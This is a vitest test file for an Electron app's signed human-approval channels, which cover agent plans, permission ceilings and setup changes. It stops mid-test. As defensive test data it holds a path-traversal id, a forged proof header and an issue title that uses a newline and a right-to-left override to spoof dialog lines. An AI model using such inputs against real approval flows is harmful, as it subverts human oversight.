// @vitest-environment node
import type { BaseWindow, MessageBoxOptions, WebContents } from "electron";
import { describe, expect, it, vi } from "vitest";
import type { components } from "../api/schema";
import {
	LADO_PRESENCE_ADOPT_SETUP_CHANNEL,
	LADO_PRESENCE_APPROVE_INTEGRATION_CHANNEL,
	LADO_PRESENCE_APPROVE_PLAN_CHANNEL,
	LADO_PRESENCE_CHANGE_PROJECT_CHECKS_CHANNEL,
	LADO_PRESENCE_CHANGE_RULE_CHANNEL,
	LADO_PRESENCE_CHANGE_SETUP_CHANNEL,
	LADO_PRESENCE_RESTORE_SETUP_CHANNEL,
	LADO_PRESENCE_SET_LADO_MODE_CHANNEL,
	type LadoPresenceAdoptSetupResult,
	type LadoPresenceApproval,
	type LadoPresenceApproveResult,
	type LadoPresenceChecksResult,
	type LadoPresenceIntegration,
	type LadoPresenceIntegrationResult,
	type LadoPresenceModeResult,
	type LadoPresenceProjectSettings,
	type LadoPresenceRestoreSetupResult,
	type LadoPresenceRule,
	type LadoPresenceRuleChangeResult,
	type LadoPresenceSetupChangeResult,
	type LadoPresenceSetupEntry,
} from "../shared/lado-presence";
import type { AppLocale } from "../shared/ui-locale";
import {
	LADO_PRESENCE_HEADER,
	ladoPresenceKey,
	registerLadoPresenceIpc,
	signLadoPresence,
	type LadoPresenceDeps,
} from "./lado-presence";
import { trayCatalogs } from "./tray-catalog.generated";

const SHA = "a".repeat(64);
const POLICY_SHA = "c".repeat(64);
const BASE = "http://127.0.0.1:3001";
const CEILING = "agent.permission.ceiling";
// What setup's clock and random bytes give every proof.
const NONCE = "AAAAAAAAAAAAAAAAAAAAAA";
const EXPIRES = 1792400000;
// backend/internal/service/ladopresence TestSignMatchesTheDesktopApp pins the
// same vector, so the two signers cannot drift apart.
const VECTOR = "v1.AAAAAAAAAAAAAAAAAAAAAA.1792400000.eh5sJcCnuuZHmMIBJ7sPF9UVbNtH_31e7ODo_8twalk";
const VECTOR_BODY = `{"sha256":"${SHA}"}`;

type PlanOverrides = { valid?: boolean; latest?: boolean; title?: string };

function planResponse(overrides: PlanOverrides = {}): components["schemas"]["LadoPlanResponse"] {
	return {
		approved: false,
		content: "---\ntask: lado-task-1\n---\n",
		latest: overrides.latest ?? true,
		plan: { acceptanceCriteria: [], affectedPaths: [], body: "", changeKinds: [], reviewRequired: false, steps: [], testCommands: [], parts: [], integrationSteps: [], warnings: [] },
		revision: {
			createdAt: "2026-10-20T00:00:00Z",
			id: "lado-plan-1",
			issueSnapshotSha256: "b".repeat(64),
			number: 3,
			problems: [],
			requestId: "lado-request-1",
			sha256: SHA,
			source: "agent",
			taskId: "lado-task-1",
			valid: overrides.valid ?? true,
		},
		task: {
			createdAt: "2026-10-20T00:00:00Z",
			id: "lado-task-1",
			issue: {
				number: 12,
				observedAt: "2026-10-20T00:00:00Z",
				ref: "github:acme/demo#12",
				state: "open",
				title: overrides.title ?? "Fix the flaky login test",
				url: "https://github.com/acme/demo/issues/12",
			},
			plan: { requestPending: false },
			projectId: "demo",
			repository: "github:acme/demo",
			state: "planned",
		},
	};
}

type EffectiveOverrides = Partial<components["schemas"]["LadoEffectiveResponse"]>;

function effectiveRule(ruleId: string, on: boolean, isProtected = false): components["schemas"]["LadoEffectiveRuleResponse"] {
	return {
		builtin: true,
		category: "workflow",
		enforcement: ["workflow_gate"],
		global: on ? "on" : "off",
		name: ruleId,
		on,
		project: "inherit",
		protected: isProtected,
		ruleId,
		source: { scope: "global", scopeId: "", state: on ? "on" : "off" },
		strength: "prevents",
		task: "inherit",
		version: 1,
	};
}

function effectiveResponse(overrides: EffectiveOverrides = {}): components["schemas"]["LadoEffectiveResponse"] {
	return {
		agent: { harness: "claude-code", model: "", source: "project" },
		aoRules: [],
		blocking: false,
		capabilities: [],
		permissionCeiling: "auto",
		permissionMode: "auto",
		problems: [],
		projectId: "demo",
		prompt: "",
		rules: [
			effectiveRule("plan.approval.required", true, true),
			effectiveRule(CEILING, true, true),
			effectiveRule("git.commit.message.korean", false),
		],
		snapshotSha256: POLICY_SHA,
		taskId: "lado-task-1",
		setup: { items: [], aoSystemSha256: "", conflicts: [], accepted: [] },
		...overrides,
	};
}

function ceilingRule(overrides: Partial<LadoPresenceRule> = {}): LadoPresenceRule {
	return {
		archived: false,
		builtin: true,
		category: "tools",
		ceiling: { mode: "auto" },
		conflictsWith: [],
		createdAt: "2026-10-20T00:00:00Z",
		enforcement: ["tool_policy"],
		global: "on",
		id: CEILING,
		instruction: "",
		name: "Permission ceiling",
		overrides: [],
		protected: true,
		sha256: "d".repeat(64),
		strength: "prevents",
		updatedAt: "2026-10-21T00:00:00Z",
		version: 2,
		versionId: "lado-rule-version-2",
		...overrides,
	};
}

const changedCeiling = ceilingRule({ ceiling: { mode: "bypass-permissions" }, version: 3, versionId: "lado-rule-version-3" });

// The hash the daemon gives a project without check commands.
const NO_COMMANDS_SHA = "4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945";

function settingsResponse(ladoMode = true): LadoPresenceProjectSettings {
	return { projectId: "demo", ladoMode, maxConcurrent: 1, checkCommands: [], checkCommandsSha256: NO_COMMANDS_SHA, checkTimeoutMinutes: 30, overlapWait: true, overlapIgnore: [], overlapIgnoreIsDefault: true };
}

function projectResponse(name = "Demo app"): components["schemas"]["ProjectGetResponse"] {
	return {
		status: "ok",
		project: {
			defaultBranch: "main",
			folderMissing: false,
			id: "demo",
			kind: "single_repo",
			name,
			path: "/home/dev/demo",
			repo: "acme/demo",
		},
	};
}

const approval: LadoPresenceApproval = {
	approvedAt: "2026-10-20T00:01:00Z",
	id: "lado-approval-1",
	revisionId: "lado-plan-1",
	sha256: SHA,
	taskId: "lado-task-1",
};

function json(status: number, body: unknown): Response {
	return new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
}

// LADO fork: local setup's adoption, restore and changes (step 7).
const PLAN_SHA = "e".repeat(64);
const CHANGE_SHA = "7".repeat(64);
const DRIFT_SHA = "d".repeat(64);
const UNREADABLE = "LADO_PRESENCE_ANSWER_UNREADABLE";
const setupEntries: LadoPresenceSetupEntry[] = [
	{ tool: "claude-code", kind: "skill", name: "review", action: "move" },
	{ tool: "claude-code", kind: "setting", name: "hooks", action: "move" },
	{ tool: "codex", kind: "mcp_server", name: "search", action: "move" },
	{ tool: "claude-code", kind: "setting", name: "theme", action: "keep" },
];

type AdoptResponse = components["schemas"]["LadoSetupAdoptResponse"];
type PreviewOverrides = Partial<AdoptResponse["preview"]>;

function adoptionPreview(overrides: PreviewOverrides = {}, entries = setupEntries): AdoptResponse {
	return {
		adoptionId: "",
		applied: false,
		items: [],
		state: "",
		verification: [],
		warnings: [],
		preview: {
			conflicts: [],
			// The daemon sorts the entries by tool, kind and name.
			entries: [...entries]
				.sort((a, b) => `${a.tool}/${a.kind}/${a.name}`.localeCompare(`${b.tool}/${b.kind}/${b.name}`))
				.map((entry) => ({
					...entry,
					delivery: entry.action === "move" ? (entry.tool === "codex" ? "overlay" : "home") : "",
					keptInPlace: [],
					managedPath: entry.action === "move" ? `/state/lado/harness/${entry.tool}/${entry.name}` : "",
					originPath: `/home/dev/.claude/${entry.name}`,
					sha256: "f".repeat(64),
					size: 12,
				})),
			os: "linux",
			planSha256: PLAN_SHA,
			preconditions: { ok: true, os: "linux", processes: [], processesIgnored: false, sessions: [], unverified: [] },
			rewrites: [],
			warnings: ["LADO_SETUP_DIRECT_USE_STOPS"],
			...overrides,
		},
	};
}

const adopted: AdoptResponse = { ...adoptionPreview(), adoptionId: "adoption-1", applied: true, state: "completed" };

function setupItem(overrides: Partial<components["schemas"]["LadoSetupItemResponse"]> = {}): components["schemas"]["LadoSetupItemResponse"] {
	return {
		adoptionId: "adoption-1",
		createdAt: "2026-10-26T00:00:00Z",
		id: "item-1",
		kind: "mcp_server",
		live: true,
		name: "search",
		originPath: "/home/dev/.claude.json#mcpServers.search",
		tool: "claude-code",
		...overrides,
	};
}

type Preconditions = components["schemas"]["LadoSetupPreconditionsResponse"];
const nothingRunning: Preconditions = { ok: true, os: "linux", processes: [], processesIgnored: false, sessions: [], unverified: [] };

function adoptionDetail(
	overrides: Partial<components["schemas"]["LadoSetupAdoptionResponse"]> = {},
	backupReadable = true,
	preconditions: Preconditions | undefined = nothingRunning,
): components["schemas"]["LadoSetupAdoptionDetailResponse"] {
	return {
		adoption: {
			actor: "human",
			createdAt: "2026-10-26T00:00:00Z",
			errorMessage: "",
			id: "adoption-1",
			itemCount: 3,
			manifestSha256: "b".repeat(64),
			os: "linux",
			planSha256: PLAN_SHA,
			state: "completed",
			...overrides,
		},
		backup: [],
		backupReadable,
		items: [setupItem(), setupItem({ id: "item-2", kind: "skill", name: "review" }), setupItem({ id: "item-3", kind: "setting", name: "hooks" })],
		...(preconditions ? { preconditions } : {}),
	};
}

const restored: components["schemas"]["LadoSetupRestoreResponse"] = {
	adoptionId: "adoption-1",
	applied: true,
	report: { entries: [] },
	restoredAt: "2026-10-26T01:00:00Z",
	warnings: [],
};

type ChangeResponse = components["schemas"]["LadoSetupChangeResponse"];

function changePreview(overrides: Partial<ChangeResponse> = {}): ChangeResponse {
	return {
		actor: "",
		applied: false,
		changeSha256: CHANGE_SHA,
		conflictsAdded: [],
		conflictsRemoved: [],
		impact: { projects: [], tasks: [] },
		item: setupItem({ adoptionId: "", id: "", originPath: "" }),
		needsPresence: true,
		op: "create",
		pins: 0,
		warnings: [],
		...overrides,
	};
}

// The item as it resolves in a project or task, from LadoSetupItemListResponse.
function scopeItem(overrides: Partial<components["schemas"]["LadoSetupItemStateResponse"]> = {}): components["schemas"]["LadoSetupItemStateResponse"] {
	return {
		global: "on",
		installedSha256: "",
		itemId: "item-1",
		kind: "mcp_server",
		name: "search",
		on: true,
		project: "force_off",
		sha256: "f".repeat(64),
		source: { scope: "project", scopeId: "demo", state: "force_off" },
		task: "inherit",
		tool: "claude-code",
		version: 1,
		versionId: "version-1",
		...overrides,
	};
}

// LADO fork: verification and the integration approval (step 8).
const HEAD = "1234567890abcdef1234567890abcdef12345678";
const VERIFY_SHA = "9".repeat(64);
const PR_URL = "https://github.com/acme/demo/pull/7";
const PATHS_RULE = "paths.protected";
type ExecutionResponse = components["schemas"]["LadoExecutionResponse"];
type VerifyItem = components["schemas"]["LadoVerifyItemResponse"];

function executionResponse(overrides: Partial<ExecutionResponse> = {}): ExecutionResponse {
	return {
		attempt: 1,
		base: { dispatchSha: "f".repeat(40) },
		plan: { approvedAt: "2026-10-27T00:00:00Z", number: 3, revisionId: "lado-plan-1", sha256: SHA },
		pr: { closed: false, headSha: HEAD, merged: false, number: 7, targetBranch: "main", title: "fix: 로그인 테스트", url: PR_URL },
		sessionEnded: false,
		sessionId: "demo-7",
		state: "integration_pending",
		snapshot: {
			agent: "claude-code",
			permissionCeiling: "auto",
			permissionMode: "auto",
			prompt: "",
			rules: [],
			setup: [],
			sha256: POLICY_SHA,
		},
		startedAt: "2026-10-27T00:00:00Z",
		task: { id: "lado-task-1", issueRef: "github:acme/demo#12", issueUrl: "https://github.com/acme/demo/issues/12", title: "Fix the flaky login test" },
		...overrides,
	};
}

// What needs confirming: an unclear commit, paths outside the plan and an
// unprotected base branch; review and evidence only inform.
const confirmItems: VerifyItem[] = [
	{ kind: "required_checks", outcome: "pass", details: { required: ["ci"], rulesetRead: true, checks: [] } },
	{ kind: "commands", outcome: "pass", details: { runs: [] } },
	{
		kind: "commit_messages",
		outcome: "confirm",
		code: "commit_messages_unclear",
		details: {
			commits: [
				{ sha: "abcdef1234567890abcdef1234567890abcdef12", subject: "update", result: "unclear" },
				{ sha: "bcdef1234567890abcdef1234567890abcdef123", subject: "로그인 테스트 고침", result: "ok" },
			],
			prTitle: { text: "fix: 로그인 테스트", result: "ok" },
		},
	},
	{
		kind: "paths",
		outcome: "confirm",
		code: "outside_plan",
		details: { protected: [], outsidePlan: ["docs/a.md", "docs/b.md", "src/c.ts", "src/d.ts"], outsideCount: 4 },
	},
	{ kind: "base_branch", outcome: "pass", code: "no_local_branch", details: { branch: "main", remote: "origin", moved: [], alreadyOnBase: false } },
	{
		kind: "protection",
		outcome: "confirm",
		code: "unprotected",
		details: { provider: "github", repo: "acme/demo", branch: "main", missing: ["pull_request", "required_status_checks:lado/integration"] },
	},
	{ kind: "review", outcome: "info", code: "not_required", details: {} },
	{ kind: "evidence", outcome: "info", details: { criteria: [] } },
];
const confirmCodes = ["commit_messages_unclear", "outside_plan", "unprotected"];

type IntegrationOverrides = { outcome?: "pass" | "wait" | "fail" | "confirm"; items?: VerifyItem[]; confirm?: string[]; headSha?: string };

function integrationPreview(overrides: IntegrationOverrides = {}): LadoPresenceIntegration {
	return {
		confirm: overrides.confirm ?? confirmCodes,
		verification: {
			computedAt: "2026-10-27T00:05:00Z",
			evidence: [],
			headSha: overrides.headSha ?? HEAD,
			items: overrides.items ?? confirmItems,
			outcome: overrides.outcome ?? "confirm",
			prUrl: PR_URL,
			sha256: VERIFY_SHA,
		},
		verificationSha256: VERIFY_SHA,
	};
}

const integrationApproved: LadoPresenceIntegration = {
	...integrationPreview(),
	approval: {
		acknowledged: confirmCodes,
		actor: "human",
		approvedAt: "2026-10-27T00:06:00Z",
		headSha: HEAD,
		id: "lado-integration-1",
		targetBranch: "main",
		statusAttempts: 1,
		statusPostedAt: "2026-10-27T00:06:01Z",
		statusState: "posted",
		verificationSha256: VERIFY_SHA,
	},
};

function pathsRule(globs: string[], overrides: Partial<LadoPresenceRule> = {}): LadoPresenceRule {
	return ceilingRule({
		category: "git",
		ceiling: undefined,
		enforcement: ["validator", "prompt"],
		id: PATHS_RULE,
		name: "Protected paths",
		paths: { globs },
		version: 1,
		versionId: "lado-rule-version-paths-1",
		...overrides,
	});
}

type Route = () => Response | Promise<Response>;
type Routes = {
	plan?: Route;
	effective?: Route;
	approve?: Route;
	rule?: Route;
	patch?: Route;
	settings?: Route;
	project?: Route;
	put?: Route;
	adoptPreview?: Route;
	adopt?: Route;
	adoption?: Route;
	restore?: Route;
	changePreview?: Route;
	change?: Route;
	scopeItems?: Route;
	execution?: Route;
	integrationPreview?: Route;
	integration?: Route;
};

function setup(overrides: Partial<LadoPresenceDeps> = {}, routes: Routes = {}) {
	type Handler = (event: unknown, input?: unknown) => Promise<unknown>;
	const handlers = new Map<string, Handler>();
	const shell = { id: 1 } as unknown as WebContents;
	const window = { id: 2 } as unknown as BaseWindow;
	const calls: { url: string; init: RequestInit }[] = [];
	const fetch = vi.fn(async (url: string, init: RequestInit) => {
		calls.push({ url, init });
		const { pathname } = new URL(url);
		if (pathname.startsWith("/api/v1/lado/setup/")) {
			// A delete asks for its dry run in the query.
			const dryRun =
				new URL(url).searchParams.get("dryRun") === "true" ||
				(typeof init.body === "string" && init.body !== "" && JSON.parse(init.body).dryRun === true);
			if (init.method === "GET" && pathname === "/api/v1/lado/setup/items") {
				return routes.scopeItems ? routes.scopeItems() : json(200, { items: [scopeItem()] });
			}
			if (pathname === "/api/v1/lado/setup/adoptions") {
				if (dryRun) return routes.adoptPreview ? routes.adoptPreview() : json(200, adoptionPreview());
				return routes.adopt ? routes.adopt() : json(200, adopted);
			}
			if (pathname.endsWith("/restore")) return routes.restore ? routes.restore() : json(200, restored);
			if (pathname.startsWith("/api/v1/lado/setup/adoptions/")) return routes.adoption ? routes.adoption() : json(200, adoptionDetail());
			if (dryRun) return routes.changePreview ? routes.changePreview() : json(200, changePreview());
			return routes.change ? routes.change() : json(200, changePreview({ applied: true, actor: "human" }));
		}
		if (pathname.startsWith("/api/v1/lado/executions/")) {
			if (init.method === "GET") return routes.execution ? routes.execution() : json(200, executionResponse());
			if (typeof init.body === "string" && JSON.parse(init.body).dryRun === true) {
				return routes.integrationPreview ? routes.integrationPreview() : json(200, integrationPreview());
			}
			return routes.integration ? routes.integration() : json(200, integrationApproved);
		}
		if (init.method === "GET" && pathname.startsWith("/api/v1/lado/plans/")) {
			return routes.plan ? routes.plan() : json(200, planResponse());
		}
		if (init.method === "GET" && pathname === "/api/v1/lado/effective") {
			return routes.effective ? routes.effective() : json(200, effectiveResponse());
		}
		if (init.method === "GET" && pathname.startsWith("/api/v1/lado/projects/")) {
			return routes.settings ? routes.settings() : json(200, settingsResponse());
		}
		if (init.method === "GET" && pathname.startsWith("/api/v1/projects/")) {
			return routes.project ? routes.project() : json(200, projectResponse());
		}
		if (init.method === "PUT") return routes.put ? routes.put() : json(200, settingsResponse(false));
		if (init.method === "GET") return routes.rule ? routes.rule() : json(200, { rule: ceilingRule(), versions: [] });
		if (init.method === "PATCH") {
			return routes.patch ? routes.patch() : json(200, { applied: true, impact: { projects: [], tasks: [] }, rule: changedCeiling });
		}
		return routes.approve ? routes.approve() : json(200, approval);
	});
	const dialog = { showMessageBox: vi.fn(async (..._args: unknown[]) => ({ response: 1, checkboxChecked: false })) };
	registerLadoPresenceIpc({
		ipcMain: { handle: (channel: string, handler: Handler) => handlers.set(channel, handler) } as unknown as LadoPresenceDeps["ipcMain"],
		dialog: dialog as unknown as LadoPresenceDeps["dialog"],
		fetch,
		token: () => "desktop-token",
		daemonBaseUrl: () => BASE,
		parentWindow: () => window,
		locale: () => "en",
		isTrustedSender: (sender) => sender === shell,
		// With these, every proof has NONCE and EXPIRES, the pinned vector's.
		now: () => 1_792_399_940_000,
		randomBytes: (size) => new Uint8Array(size),
		...overrides,
	});
	const approveHandler = handlers.get(LADO_PRESENCE_APPROVE_PLAN_CHANNEL);
	const changeRuleHandler = handlers.get(LADO_PRESENCE_CHANGE_RULE_CHANNEL);
	const setModeHandler = handlers.get(LADO_PRESENCE_SET_LADO_MODE_CHANNEL);
	const adoptSetupHandler = handlers.get(LADO_PRESENCE_ADOPT_SETUP_CHANNEL);
	const restoreSetupHandler = handlers.get(LADO_PRESENCE_RESTORE_SETUP_CHANNEL);
	const changeSetupHandler = handlers.get(LADO_PRESENCE_CHANGE_SETUP_CHANNEL);
	const integrationHandler = handlers.get(LADO_PRESENCE_APPROVE_INTEGRATION_CHANNEL);
	const checksHandler = handlers.get(LADO_PRESENCE_CHANGE_PROJECT_CHECKS_CHANNEL);
	if (
		!approveHandler ||
		!changeRuleHandler ||
		!setModeHandler ||
		!adoptSetupHandler ||
		!restoreSetupHandler ||
		!changeSetupHandler ||
		!integrationHandler ||
		!checksHandler
	) {
		throw new Error("a presence channel is not registered");
	}
	return {
		approve: (input: unknown, sender: unknown = shell) =>
			approveHandler({ sender }, input) as Promise<LadoPresenceApproveResult>,
		changeRule: (input: unknown, sender: unknown = shell) =>
			changeRuleHandler({ sender }, input) as Promise<LadoPresenceRuleChangeResult>,
		setMode: (input: unknown, sender: unknown = shell) =>
			setModeHandler({ sender }, input) as Promise<LadoPresenceModeResult>,
		adoptSetup: (input: unknown, sender: unknown = shell) =>
			adoptSetupHandler({ sender }, input) as Promise<LadoPresenceAdoptSetupResult>,
		restoreSetup: (input: unknown, sender: unknown = shell) =>
			restoreSetupHandler({ sender }, input) as Promise<LadoPresenceRestoreSetupResult>,
		changeSetup: (input: unknown, sender: unknown = shell) =>
			changeSetupHandler({ sender }, input) as Promise<LadoPresenceSetupChangeResult>,
		approveIntegration: (input: unknown, sender: unknown = shell) =>
			integrationHandler({ sender }, input) as Promise<LadoPresenceIntegrationResult>,
		changeChecks: (input: unknown, sender: unknown = shell) =>
			checksHandler({ sender }, input) as Promise<LadoPresenceChecksResult>,
		calls,
		dialog,
		fetch,
		window,
	};
}

function expectSigned(call: { url: string; init: RequestInit }, method: string, body: string) {
	const headers = call.init.headers as Record<string, string>;
	expect(call.init.method).toBe(method);
	expect(call.init.body).toBe(body);
	// The proof covers exactly the path and the bytes that were sent.
	expect(headers).toEqual({
		"content-type": "application/json",
		[LADO_PRESENCE_HEADER]: signLadoPresence(ladoPresenceKey("desktop-token"), method, new URL(call.url).pathname, body, NONCE, EXPIRES),
	});
}

// A request main sends without a proof: a preview, or a change that needs none.
function expectUnsigned(call: { url: string; init: RequestInit }, method: string, body: string) {
	expect(call.init.method).toBe(method);
	expect(call.init.body).toBe(body);
	expect(call.init.headers).toEqual({ "content-type": "application/json" });
}

function dialogOptions(dialog: ReturnType<typeof setup>["dialog"]): MessageBoxOptions {
	const args = dialog.showMessageBox.mock.lastCall ?? [];
	return args[args.length - 1] as MessageBoxOptions;
}

describe("signLadoPresence", () => {
	it("derives the key and signs the vector the daemon pins", () => {
		const key = ladoPresenceKey("desktop-token");
		expect(key).toHaveLength(32);
		expect(
			signLadoPresence(key, "POST", "/api/v1/lado/plans/lado-plan-1/approve", VECTOR_BODY, "AAAAAAAAAAAAAAAAAAAAAA", 1792400000),
		).toBe(VECTOR);
	});
});

describe("registerLadoPresenceIpc", () => {
	it("refuses a caller that is not the app's shell", async () => {
		const { approve, dialog, fetch } = setup();
		await expect(approve({ revisionId: "lado-plan-1" }, { id: 99 })).resolves.toMatchObject({
			status: "error",
			code: "LADO_PRESENCE_UNTRUSTED_SENDER",
		});
		expect(fetch).not.toHaveBeenCalled();
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
	});

	it.each([
		null,
		"lado-plan-1",
		{},
		{ revisionId: 7 },
		{ revisionId: "" },
		{ revisionId: "../lado-plan-1" },
		{ revisionId: "lado plan" },
		{ revisionId: "x".repeat(129) },
	])("refuses the revision id in %j", async (input) => {
		const { approve, fetch } = setup();
		await expect(approve(input)).resolves.toMatchObject({ status: "error", code: "LADO_PLAN_REVISION_ID_INVALID" });
		expect(fetch).not.toHaveBeenCalled();
	});

	it("reports a daemon that is not ready", async () => {
		const { approve, dialog, fetch } = setup({ daemonBaseUrl: () => null });
		await expect(approve({ revisionId: "lado-plan-1" })).resolves.toMatchObject({
			status: "error",
			code: "SERVICE_UNAVAILABLE",
		});
		expect(fetch).not.toHaveBeenCalled();
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
	});

	it("sends nothing when the human cancels", async () => {
		const { approve, calls, dialog, window } = setup();
		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });

		await expect(approve({ revisionId: "lado-plan-1" })).resolves.toEqual({ status: "cancelled" });

		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}/api/v1/lado/plans/lado-plan-1`],
			["GET", `${BASE}/api/v1/lado/effective?taskId=lado-task-1`],
		]);
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				buttons: ["Cancel", "Approve"],
				defaultId: 0,
				cancelId: 0,
				noLink: true,
			}),
		);
	});

	it("signs the plan and rule snapshot hashes together", async () => {
		const { approve, calls } = setup();
		// The renderer cannot pick either hash or add headers.
		const result = await approve({
			revisionId: "lado-plan-1",
			sha256: "f".repeat(64),
			policySha256: "e".repeat(64),
			headers: { [LADO_PRESENCE_HEADER]: "v1.forged" },
		});

		expect(result).toEqual({ status: "approved", approval });
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}/api/v1/lado/plans/lado-plan-1`],
			["GET", `${BASE}/api/v1/lado/effective?taskId=lado-task-1`],
			["POST", `${BASE}/api/v1/lado/plans/lado-plan-1/approve`],
		]);
		expectSigned(calls[2]!, "POST", `{"sha256":"${SHA}","policySha256":"${POLICY_SHA}"}`);
	});

	it("refuses to approve when the effective rules cannot be read", async () => {
		const unreadable: [string, Route, string | undefined][] = [
			[
				"an error envelope",
				() => json(409, { error: "conflict", code: "LADO_PLAN_BLOB_MISSING", message: "The pinned copy of this plan is missing." }),
				"LADO_PLAN_BLOB_MISSING",
			],
			["a broken answer", () => new Response("bad gateway", { status: 502 }), undefined],
			["no snapshot hash", () => json(200, effectiveResponse({ snapshotSha256: "" })), UNREADABLE],
			["a short snapshot hash", () => json(200, effectiveResponse({ snapshotSha256: "c".repeat(63) })), UNREADABLE],
			["another task's rules", () => json(200, effectiveResponse({ taskId: "lado-task-2" })), UNREADABLE],
			["no rules", () => json(200, { ...effectiveResponse(), rules: undefined }), UNREADABLE],
			["an unreachable daemon", () => Promise.reject(new TypeError("fetch failed")), "SERVICE_UNAVAILABLE"],
		];
		for (const [name, effective, code] of unreadable) {
			const { approve, calls, dialog } = setup({}, { effective });
			const result = await approve({ revisionId: "lado-plan-1" });
			expect(result, name).toMatchObject({ status: "error" });
			expect(result.status === "error" ? result.code : "", name).toBe(code);
			// No confirmation is shown and nothing is sent.
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls.map(({ init }) => init.method), name).toEqual(["GET", "GET"]);
		}
	});

	it("names the rules and their blocking problems in the confirmation", async () => {
		const blocked = effectiveResponse({
			permissionCeiling: "bypass-permissions",
			problems: [
				{ code: "LADO_AGENT_NOT_CHOSEN", severity: "blocking", rules: [], details: {} },
				{ code: "LADO_RULES_CONFLICT", severity: "blocking", rules: ["a", "b"], details: {} },
				{ code: "LADO_CODEX_ASKS_APPROVAL", severity: "info", rules: [], details: { mode: "auto" } },
			],
		});
		const { approve, dialog } = setup({}, { effective: () => json(200, blocked) });
		await approve({ revisionId: "lado-plan-1" });
		expect(dialogOptions(dialog).detail?.split("\n\n").slice(-1)).toEqual([
			"Rules: 2 on, permission ceiling Bypass permissions\nrules sha256 cccccccccccc\n" +
				"Blocking problems: 2. The task stays blocked until they are fixed.",
		]);
	});

	it.each([
		["LADO_PLAN_INVALID", { valid: false }],
		["LADO_PLAN_SUPERSEDED", { latest: false }],
	] as const)("does not ask about a plan the daemon would refuse (%s)", async (code, overrides) => {
		const { approve, calls, dialog } = setup({}, { plan: () => json(200, planResponse(overrides)) });
		await expect(approve({ revisionId: "lado-plan-1" })).resolves.toMatchObject({ status: "error", code });
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
		expect(calls).toHaveLength(1);
	});

	it("returns the daemon's error envelope", async () => {
		const missing = setup({}, {
			plan: () => json(404, { error: "not_found", code: "LADO_PLAN_NOT_FOUND", message: "Unknown plan revision", requestId: "req-1" }),
		});
		await expect(missing.approve({ revisionId: "lado-plan-1" })).resolves.toEqual({
			status: "error",
			code: "LADO_PLAN_NOT_FOUND",
			message: "Unknown plan revision",
		});
		expect(missing.dialog.showMessageBox).not.toHaveBeenCalled();

		const refused = setup({}, {
			approve: () =>
				json(403, {
					error: "forbidden",
					code: "LADO_PRESENCE_EXPIRED",
					message: "The confirmation expired. Approve again in the AO desktop app.",
					details: { revisionId: "lado-plan-1" },
				}),
		});
		await expect(refused.approve({ revisionId: "lado-plan-1" })).resolves.toEqual({
			status: "error",
			code: "LADO_PRESENCE_EXPIRED",
			message: "The confirmation expired. Approve again in the AO desktop app.",
			details: { revisionId: "lado-plan-1" },
		});

		const broken = setup({}, { approve: () => new Response("bad gateway", { status: 502 }) });
		await expect(broken.approve({ revisionId: "lado-plan-1" })).resolves.toEqual({
			status: "error",
			message: "The AO daemon answered HTTP 502.",
		});
	});

	it("turns failures into results instead of throwing across IPC", async () => {
		const down = setup({}, { plan: () => Promise.reject(new TypeError("fetch failed")) });
		await expect(down.approve({ revisionId: "lado-plan-1" })).resolves.toMatchObject({
			status: "error",
			code: "SERVICE_UNAVAILABLE",
		});
		expect(down.dialog.showMessageBox).not.toHaveBeenCalled();

		const lost = setup({}, { approve: () => Promise.reject(new TypeError("fetch failed")) });
		await expect(lost.approve({ revisionId: "lado-plan-1" })).resolves.toMatchObject({
			status: "error",
			code: "SERVICE_UNAVAILABLE",
		});

		const noDialog = setup();
		noDialog.dialog.showMessageBox.mockRejectedValueOnce(new Error("window is gone"));
		await expect(noDialog.approve({ revisionId: "lado-plan-1" })).resolves.toEqual({
			status: "error",
			message: "window is gone",
		});
		expect(noDialog.calls).toHaveLength(2);
	});

	it("words the confirmation from main's catalog in the current language", async () => {
		let locale: AppLocale = "ko";
		const { approve, dialog } = setup({ locale: () => locale, parentWindow: () => null });

		await approve({ revisionId: "lado-plan-1" });
		const ko = trayCatalogs.ko;
		// No window to attach to: the dialog gets the options alone.
		expect(dialog.showMessageBox.mock.lastCall).toHaveLength(1);
		expect(dialogOptions(dialog)).toMatchObject({
			message: ko["lado.presence.approveTitle"],
			buttons: [ko["lado.presence.cancel"], ko["lado.presence.approve"]],
			detail: [
				ko["lado.presence.approveDetail"]
					.replace("{{task}}", "Fix the flaky login test")
					.replace("{{issue}}", "github:acme/demo#12")
					.replace("{{revision}}", "3")
					.replace("{{sha}}", "aaaaaaaaaaaa"),
				ko["lado.presence.approveRules"]
					.replace("{{on}}", "2")
					.replace("{{ceiling}}", ko["lado.presence.mode.auto"])
					.replace("{{sha}}", "cccccccccccc"),
			].join("\n\n"),
		});
		expect(dialogOptions(dialog).message).not.toBe(trayCatalogs.en["lado.presence.approveTitle"]);

		// A language change applies to the next confirmation.
		locale = "en";
		await approve({ revisionId: "lado-plan-1" });
		expect(dialogOptions(dialog)).toMatchObject({
			message: "Approve this plan?",
			detail:
				"Fix the flaky login test\ngithub:acme/demo#12, revision 3\nsha256 aaaaaaaaaaaa\n\n" +
				"LADO starts work only from the plan you approve.\n\n" +
				"Rules: 2 on, permission ceiling Auto\nrules sha256 cccccccccccc",
		});
	});

	it("keeps an issue title from faking the dialog's other lines", async () => {
		const title = "Fix login\ngithub:acme/other#1, revision 9\u202e";
		const { approve, dialog } = setup({}, { plan: () => json(200, planResponse({ title })) });
		await approve({ revisionId: "lado-plan-1" });
		expect(dialogOptions(dialog).detail?.split("\n").slice(0, 3)).toEqual([
			"Fix login github:acme/other#1, revision 9",
			"github:acme/demo#12, revision 3",
			"sha256 aaaaaaaaaaaa",
		]);
	});
});

describe("the permission ceiling change", () => {
	const request = { ruleId: CEILING, ceiling: { mode: "bypass-permissions" } };
	const rulePath = `/api/v1/lado/rules/${CEILING}`;

	it("changes the permission ceiling after confirmation", async () => {
		const { changeRule, calls, dialog, window } = setup();
